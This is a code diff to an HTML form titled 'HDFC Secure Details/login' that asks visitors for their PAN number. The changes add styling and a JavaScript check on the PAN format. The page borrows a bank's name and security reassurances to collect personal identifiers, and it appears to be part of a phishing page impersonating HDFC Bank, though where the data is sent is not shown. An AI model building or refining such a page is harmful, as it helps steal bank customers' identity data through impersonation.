@@ -10,6 +10,7 @@
 <link rel="manifest" href="/site.webmanifest">
 <meta name="msapplication-TileColor" content="#da532c">
 <meta name="theme-color" content="#ffffff">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,wght@1,500&display=swap" rel="stylesheet">
     <title>HDFC Secure Details/login</title>
     <style>
         #aa
@@ -89,6 +90,24 @@
             border-bottom:solid #f3f3f3;
             border-width:10px;
         }
+        .name
+        {
+        text-transform:uppercase;
+        }
+        .PAN
+        {
+        text-transform:uppercase;
+        }
+        .error
+        {
+        color: Red;
+        font-family: 'DM Sans', sans-serif;
+        font-size:12px;
+        margin:5px;
+        margin-left:20px;
+        visibility: hidden;
+        font-style: italic;
+        }
     </style>
     <script language="javascript">
     
@@ -166,12 +185,28 @@
          padding:0px 20px; font-size:15px;"> Enter PAN Number <span style="color:#f06565;">:</span></p1>
         </div>
         <div id="xx">
-         <input type="text"name="PAN No." id="dd" placeholder="Enter PAN Number"
-          pattern="[aA-aZ]{5,}[0-9]{4,}[aA-aZ]{1,}"
-          title="Valid PAN Format Is:ABCDE1234A"
-          required=""><br><br>
+         <input type="text"name="PAN No." class="PAN" id="dd" maxlength="10" placeholder="Enter PAN Number"
+         pattern="[aA-zZ]{5}[0-9]{4}[aA-zZ]{1}"
+         title="Valid PAN format is:ABCDE1234A"
+         required="">
+         <span id="PAN" class="error">Invalid PAN Number</span>
+         </div><br>
+         <script type="text/javascript">
+         function ValidatePAN() {
+         var txtPANCard = document.getElementById("dd");
+         var lblPANCard = document.getElementById("PAN")
+         var regex = /([A-Z]){5}([0-9]){4}([A-Z]){1}$/;
+         if (regex.test(txtPANCard.value.toUpperCase())) {
+         lblPANCard.style.visibility = "hidden";
+         return true;
+         } else {
+         lblPANCard.style.visibility = "visible";
+         return false;
+         }
+         }
+         </script>
         <div id="qq">
-        <button type="submit"id="ll">
+        <button type="submit" onclick="ValidatePAN()" id="ll">
         SUBMIT</button> <br><br>
          </div>
          <div>
@@ -179,3 +214,7 @@
          <span style="color:grey; font-family:arial;">Your security is of utmost importance.</span><br>
          <span style="color:#1D85FE; font-family:arial;">Know more...</span><br><br>
          <img src="footer.jpg" alt="" id="ft">
+         </div>
+         </form>
+         </body>
+</html>
